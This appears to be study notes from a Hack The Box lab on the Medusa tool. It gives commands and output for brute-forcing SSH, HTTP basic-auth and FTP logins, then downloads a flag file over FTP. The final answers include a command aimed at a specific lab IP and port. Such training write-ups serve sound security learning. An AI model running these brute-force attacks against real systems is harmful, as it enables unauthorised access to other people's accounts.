# Medusa

## Targeting an SSH Server

Imagine a scenario where you need to test the security of an SSH server at `192.168.0.100`. You have a list of potential usernames in `usernames.txt` and common passwords in `passwords.txt`. To launch a brute-force attack against the SSH service on this server, use the following Medusa command:

```shell-session
eldeim@htb[/htb]$ medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh 
```

This command instructs Medusa to:

* Target the host at `192.168.0.100`.
* Use the usernames from the `usernames.txt` file.
* Test the passwords listed in the `passwords.txt` file.
* Employ the `ssh` module for the attack.

### Gaining Access

With the password in hand, establish an SSH connection using the following command and enter the found password when prompted:

```shell-session
eldeim@htb[/htb]$ ssh sshuser@<IP> -p PORT
```

## Targeting Multiple Web Servers with Basic HTTP Authentication

Suppose you have a list of web servers that use basic HTTP authentication. These servers' addresses are stored in `web_servers.txt`, and you also have lists of common usernames and passwords in `usernames.txt` and `passwords.txt`, respectively. To test these servers concurrently, execute:

```shell-session
eldeim@htb[/htb]$ medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET 
```

In this case, Medusa will:

* Iterate through the list of web servers in `web_servers.txt`.
* Use the usernames and passwords provided.
* Employ the `http` module with the `GET` method to attempt logins.

## Testing for Empty or Default Passwords

If you want to assess whether any accounts on a specific host (`10.0.0.5`) have empty or default passwords (where the password matches the username), you can use:

```shell-session
eldeim@htb[/htb]$ medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name
```

This command instructs Medusa to:

* Target the host at `10.0.0.5`.
* Use the usernames from `usernames.txt`.
* Perform additional checks for empty passwords (`-e n`) and passwords matching the username (`-e s`).
* Use the appropriate service module (replace `service_name` with the correct module name).

## Kick-off

The following command serves as our starting point:

```shell-session
eldeim@htb[/htb]$ medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```

Let's break down each component:

* `-h <IP>`: Specifies the target system's IP address.
* `-n <PORT>`: Defines the port on which the SSH service is listening (typically port 22).
* `-u sshuser`: Sets the username for the brute-force attack.
* `-P 2023-200_most_used_passwords.txt`: Points Medusa to a wordlist containing the 200 most commonly used passwords in 2023. The effectiveness of a brute-force attack is often tied to the quality and relevance of the wordlist used.
* `-M ssh`: Selects the SSH module within Medusa, tailoring the attack specifically for SSH authentication.
* `-t 3`: Dictates the number of parallel login attempts to execute concurrently. Increasing this number can speed up the attack but may also increase the likelihood of detection or triggering security measures on the target system.

## Targeting the FTP Server

Having identified the FTP server, you can proceed to brute-force its authentication mechanism.

If we explore the `/home` directory on the target system, we see an `ftpuser` folder, which implies the likelihood of the FTP server username being `ftpuser`. Based on this, we can modify our Medusa command accordingly:

&#x20; Web Services

```shell-session
eldeim@htb[/htb]$ medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5

Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

GENERAL: Parallel Hosts: 1 Parallel Logins: 5
GENERAL: Total Hosts: 1
GENERAL: Total Users: 1
GENERAL: Total Passwords: 197
...
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ... Password: ... [SUCCESS]
...
GENERAL: Medusa has finished.
```

The key differences here are:

* `-h 127.0.0.1`: Targets the local system, as the FTP server is running locally. Using the IP address tells medusa explicitly to use IPv4.
* `-u ftpuser`: Specifies the username `ftpuser`.
* `-M ftp`: Selects the FTP module within Medusa.
* `-t 5`: Increases the number of parallel login attempts to 5.

### Retrieving The Flag

Upon successfully cracking the FTP password, establish an FTP connection. Within the FTP session, use the `get` command to download the `flag.txt` file, which may contain sensitive information.:

```shell-session
eldeim@htb[/htb]$ ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost

Trying [::1]:21 ...
Connected to localhost.
220 (vsFTPd 3.0.5)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp> ls
229 Entering Extended Passive Mode (|||25926|)
150 Here comes the directory listing.
-rw-------    1 1001     1001           35 Sep 05 13:17 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||37251|)
150 Opening BINARY mode data connection for flag.txt (35 bytes).
100% |***************************************************************************|    35      776.81 KiB/s    00:00 ETA
226 Transfer complete.
35 bytes received in 00:00 (131.45 KiB/s)
ftp> exit
221 Goodbye.
```

### PoCs - Questions

* What was the password for the ftpuser?

With the credentials optains with the ssh bruteforce, we loging into victim machine, then see the open internal ports -->

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

FTP server active, nice, we will can brute force it too -->

```shell-session
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
```

Then, i loggin anf get the flag -->

```
ftp ftpuser@127.0.0.1
```

***

* After successfully brute-forcing the ssh session, and then logging into the ftp server on the target, what is the full flag found within flag.txt?

```
medusa -h 94.237.121.185 -n 37478 -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```
